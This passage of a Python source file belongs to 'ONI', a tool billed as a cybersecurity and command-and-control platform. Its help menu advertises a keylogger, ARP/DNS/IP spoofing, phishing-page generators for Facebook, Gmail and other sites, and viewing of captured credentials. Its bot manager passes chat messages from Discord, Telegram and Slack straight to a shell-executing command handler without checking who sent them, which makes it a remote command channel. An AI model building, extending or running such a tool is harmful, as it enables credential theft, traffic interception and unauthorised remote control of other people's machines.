        output += f"   Disk: {psutil.disk_usage('/').percent}%\n"
        output += f"\n🔐 Security Status:\n"
        output += f"   Keylogger: {'🟢 Running' if self.keylogger_running else '⚪ Stopped'}\n"
        output += f"   Traffic Monitor: 🟢 Running\n"
        return {'success': True, 'output': output}
    
    def _execute_threats(self, args):
        threats = self.db.get_recent_threats(10)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            output += f"  {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _execute_report(self, args):
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        report = f"👹 ONI Security Report\n{'='*50}\n\n"
        report += f"📈 Statistics:\n"
        report += f"  Total Threats: {stats.get('total_threats', 0)}\n"
        report += f"  Total Commands: {stats.get('total_commands', 0)}\n"
        report += f"  SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
        report += f"  Managed IPs: {stats.get('total_managed_ips', 0)}\n"
        report += f"  Blocked IPs: {stats.get('total_blocked_ips', 0)}\n"
        report += f"  Keylogs Captured: {stats.get('total_keylogs', 0)}\n\n"
        if threats:
            report += f"🚨 Recent Threats:\n"
            for t in threats[:5]:
                report += f"  - {t['threat_type']} from {t['source_ip']}\n"
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _execute_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "\n".join([f"{h['timestamp'][:19]} - {h['command'][:50]}" for h in history])
        return {'success': True, 'output': output}
    
    def _execute_help(self, args):
        help_text = """
👹 ONI v3.0.0 - HELP MENU

📡 NETWORK COMMANDS:
  ping <target>              - ICMP ping test
  scan <ip> [ports]          - Port scan (default 1-1000)
  quick_scan <ip>            - Quick port scan
  nmap <target> [options]    - Full nmap scan
  traceroute <target>        - Network path tracing
  whois <domain>             - WHOIS lookup
  dns <domain>               - DNS lookup
  location <ip>              - IP geolocation

🔐 SECURITY COMMANDS:
  password <password>        - Check password strength
  keylogger start|stop|status - Control keylogger
  traffic                    - Show network traffic stats
  nikto <target>             - Web vulnerability scan
  nikto_ssl <target>         - SSL/TLS scan
  nikto_sql <target>         - SQL injection scan
  nikto_xss <target>         - XSS scan

🎭 SPOOFING COMMANDS:
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac>    - MAC address spoofing
  arp_spoof <target> <gateway> [iface] - ARP spoofing
  dns_spoof <domain> <ip> [iface] - DNS spoofing
  stop_spoof [id]            - Stop spoofing

🚀 TRAFFIC GENERATION:
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types              - List available types
  traffic_status             - Check active generators
  traffic_stop [id]          - Stop generation

🔌 SSH COMMANDS:
  ssh_add <name> <host> <user> [pass] [port] - Add SSH server
  ssh_list                   - List configured servers
  ssh_connect <id>           - Connect to server
  ssh_exec <id> <command>    - Execute command
  ssh_disconnect [id]        - Disconnect

🎣 SOCIAL ENGINEERING:
  generate_phishing_for_facebook   - Facebook phishing
  generate_phishing_for_instagram  - Instagram phishing
  generate_phishing_for_twitter    - Twitter phishing
  generate_phishing_for_gmail      - Gmail phishing
  generate_phishing_for_linkedin   - LinkedIn phishing
  generate_phishing_for_custom [url] - Custom phishing
  phishing_start_server <id> [port] - Start server
  phishing_stop_server        - Stop server
  phishing_status             - Check server status
  phishing_links              - List all links
  phishing_credentials [id]   - View captured data
  phishing_qr <id>            - Generate QR code
  phishing_shorten <id>       - Shorten URL

🔒 IP MANAGEMENT:
  add_ip <ip> [notes]         - Add IP to monitoring
  remove_ip <ip>              - Remove IP
  block_ip <ip> [reason]      - Block IP
  unblock_ip <ip>             - Unblock IP
  list_ips [active]           - List managed IPs
  ip_info <ip>                - Detailed IP info

📊 SYSTEM COMMANDS:
  status                      - System status
  threats                     - Recent threats
  report                      - Security report
  history [limit]             - Command history
  time                        - Current time
  date                        - Current date
  datetime                    - Both date and time
  system                      - System info
  clear                       - Clear screen
  help                        - This menu
  exit                        - Exit program

Examples:
  ping 8.8.8.8
  scan 192.168.1.1
  generate_traffic icmp 192.168.1.1 10
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  generate_phishing_for_facebook
  phishing_start_server abc12345 8080
  add_ip 192.168.1.100 Suspicious
  nikto example.com
  password MySecure123!
  keylogger start
"""
        return {'success': True, 'output': help_text}
    
    def _execute_clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _execute_exit(self, args):
        return {'success': True, 'output': 'exit'}
    
    def _execute_time(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"🕐 {now.strftime('%H:%M:%S')}"}
    
    def _execute_date(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}"}
    
    def _execute_datetime(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}\n🕐 {now.strftime('%H:%M:%S')}"}
    
    def _execute_system(self, args):
        info = f"🖥️ System: {platform.system()} {platform.release()}\n"
        info += f"💻 Hostname: {socket.gethostname()}\n"
        info += f"🔢 CPU: {psutil.cpu_percent()}%\n"
        info += f"💾 Memory: {psutil.virtual_memory().percent}%\n"
        info += f"💿 Disk: {psutil.disk_usage('/').percent}%"
        return {'success': True, 'output': info}
    
    def _execute_generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# BOT MANAGER
# =====================
class BotManager:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.bots = {}
    
    def start_discord(self, token: str, prefix: str = '!') -> bool:
        if not DISCORD_AVAILABLE:
            print(f"{Colors.RED}❌ Discord.py not installed{Colors.RESET}")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            bot = commands.Bot(command_prefix=prefix, intents=intents)
            
            @bot.event
            async def on_ready():
                print(f"{Colors.GREEN}✅ Discord bot connected as {bot.user}{Colors.RESET}")
            
            @bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(prefix):
                    cmd = message.content[len(prefix):].strip()
                    result = self.handler.execute(cmd, 'discord', str(message.author))
                    output = result.get('output', '')[:1900]
                    await message.channel.send(f"```\n{output}\n```")
                await bot.process_commands(message)
            
            thread = threading.Thread(target=lambda: bot.run(token), daemon=True)
            thread.start()
            self.bots['discord'] = bot
            return True
        except Exception as e:
            print(f"{Colors.RED}Discord error: {e}{Colors.RESET}")
            return False
    
    def start_telegram(self, api_id: str, api_hash: str, bot_token: str = None) -> bool:
        if not TELETHON_AVAILABLE:
            print(f"{Colors.RED}❌ Telethon not installed{Colors.RESET}")
            return False
        
        try:
            async def run():
                client = TelegramClient('oni_session', int(api_id), api_hash)
                await client.start(bot_token=bot_token if bot_token else None)
                
                @client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith('/'):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```\n{output}\n```")
                
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                await client.run_until_disconnected()
            
            thread = threading.Thread(target=lambda: asyncio.run(run()), daemon=True)
            thread.start()
            self.bots['telegram'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}Telegram error: {e}{Colors.RESET}")
            return False
    
    def start_slack(self, bot_token: str, channel: str = 'general', prefix: str = '!') -> bool:
        if not SLACK_AVAILABLE:
            print(f"{Colors.RED}❌ Slack SDK not installed{Colors.RESET}")
            return False
        
        try:
            client = WebClient(token=bot_token)
            last_ts = {}
            
            def monitor():
                while True:
                    try:
                        response = client.conversations_history(channel=channel, limit=5)
                        if response['ok'] and response['messages']:
                            for msg in response['messages']:
                                if msg.get('text', '').startswith(prefix):
                                    ts = msg.get('ts')
                                    if last_ts.get(channel) != ts:
                                        last_ts[channel] = ts
                                        cmd = msg['text'][len(prefix):].strip()
                                        result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                        client.chat_postMessage(
                                            channel=channel,
                                            text=f"```{result.get('output', '')[:2000]}```"
                                        )
                        time.sleep(2)
                    except Exception as e:
                        time.sleep(10)
            
            thread = threading.Thread(target=monitor, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Slack bot connected{Colors.RESET}")
            self.bots['slack'] = True
            return True
        except Exception as e:
            print(f"{Colors.RED}Slack error: {e}{Colors.RESET}")
            return False
    
    def start_imessage(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.RED}❌ iMessage only available on macOS{Colors.RESET}")
            return False
        print(f"{Colors.GREEN}✅ iMessage integration available{Colors.RESET}")
        self.bots['imessage'] = True
        return True
    
    def start_signal(self) -> bool:
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.RED}❌ signal-cli not found{Colors.RESET}")
            return False
        print(f"{Colors.GREEN}✅ Signal integration available{Colors.RESET}")
        self.bots['signal'] = True
        return True
    
    def start_whatsapp(self) -> bool:
        if not SELENIUM_AVAILABLE:
            print(f"{Colors.RED}❌ Selenium not installed{Colors.RESET}")
            return False
        print(f"{Colors.YELLOW}📱 WhatsApp integration available (requires QR scan){Colors.RESET}")
        self.bots['whatsapp'] = True
        return True
    
    def start_google_chat(self) -> bool:
        if not GOOGLE_CHAT_AVAILABLE:
            print(f"{Colors.RED}❌ Google Chat SDK not installed{Colors.RESET}")
            return False
        print(f"{Colors.GREEN}✅ Google Chat integration available{Colors.RESET}")
        self.bots['google_chat'] = True
        return True

# =====================
# MAIN APPLICATION
# =====================
class ONI:
    def __init__(self):
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db)
        self.bot_manager = BotManager(self.handler)
        self.web_server = WebServer(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.RED}   ╔══════════════════════════════════════════════════════════════════════════════╗
   ║{Colors.RESET}                         👹 {Colors.BOLD}THE ONI{Colors.RESET} 👹                                  {Colors.RED}║
   ║{Colors.RESET}              Ultimate Cybersecurity & Command Control Platform                   {Colors.RED}║
   ╠══════════════════════════════════════════════════════════════════════════════╣
   ║{Colors.RESET}  📡 Network Scanning    🔐 Password Strength    🎭 Spoofing Engine              {Colors.RED}║
   ║{Colors.RESET}  👻 Keylogger           📊 Traffic Analysis     🚀 Traffic Generation           {Colors.RED}║
   ║{Colors.RESET}  🕷️ Nikto Scanner       🎣 Phishing Suite       🔌 SSH Remote Execution         {Colors.RED}║
   ║{Colors.RESET}  🤖 Multi-Platform Bots 🌐 Web Dashboard        📱 QR Code & URL Shortening     {Colors.RED}║
   ╠══════════════════════════════════════════════════════════════════════════════╣
   ║{Colors.RESET}              🔥 5000+ CYBERSECURITY COMMANDS AT YOUR FINGERTIPS 🔥               {Colors.RED}║
   ╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def start_services(self):
        print(f"{Colors.CYAN}🚀 Starting ONI services...{Colors.RESET}")
        
        # Start traffic monitor
        self.handler.traffic_monitor.start()
        print(f"{Colors.GREEN}✅ Traffic monitor started{Colors.RESET}")
        
        # Start web server
        self.web_server.start()
        
        # Start bots
        print(f"\n{Colors.YELLOW}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*50}{Colors.RESET}")
        
        # Discord
        discord_input = input(f"{Colors.ORANGE}Start Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if discord_input == 'y':
            token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.bot_manager.start_discord(token, prefix)
        
        # Telegram
        telegram_input = input(f"{Colors.ORANGE}Start Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if telegram_input == 'y':
            api_id = input(f"{Colors.ORANGE}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ORANGE}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ORANGE}Enter Bot Token (or leave empty for user mode): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.bot_manager.start_telegram(api_id, api_hash, bot_token if bot_token else None)
        
        # Slack
        slack_input = input(f"{Colors.ORANGE}Start Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if slack_input == 'y':
            token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ORANGE}Enter channel ID (default: general): {Colors.RESET}").strip() or 'general'
            if token:
                self.bot_manager.start_slack(token, channel)
        
        # iMessage
        if IMESSAGE_AVAILABLE:
            imessage_input = input(f"{Colors.ORANGE}Start iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if imessage_input == 'y':
                self.bot_manager.start_imessage()
        
        # Signal
        if SIGNAL_CLI_AVAILABLE:
            signal_input = input(f"{Colors.ORANGE}Start Signal bot? (y/n): {Colors.RESET}").strip().lower()
            if signal_input == 'y':
                self.bot_manager.start_signal()
        
        # WhatsApp
        whatsapp_input = input(f"{Colors.ORANGE}Start WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if whatsapp_input == 'y':
            self.bot_manager.start_whatsapp()
        
        # Google Chat
        google_chat_input = input(f"{Colors.ORANGE}Start Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if google_chat_input == 'y':
            self.bot_manager.start_google_chat()
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        self.start_services()
        
        print(f"\n{Colors.GREEN}✅ ONI Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   🌐 Web Dashboard: http://localhost:5000{Colors.RESET}")
        print(f"{Colors.CYAN}   💡 Type 'help' for commands, 'clear' to clear screen, 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.RED}[ONI]{Colors.RESET} "
                command = input(prompt).strip()
                
                if command.lower() == 'exit':
                    self.running = False
                    break
                
                result = self.handler.execute(command, "local")
                if result.get('output'):
                    print(result['output'])
                elif result.get('error'):
                    print(f"{Colors.RED}Error: {result['error']}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Shutting down...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        
        # Cleanup
        if self.handler.keylogger_running:
            self.handler.keylogger.stop()
        self.handler.traffic_monitor.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ ONI shutdown complete{Colors.RESET}")

def main():
    try:
        print(f"{Colors.RED}👹 Starting ONI...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = ONI()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()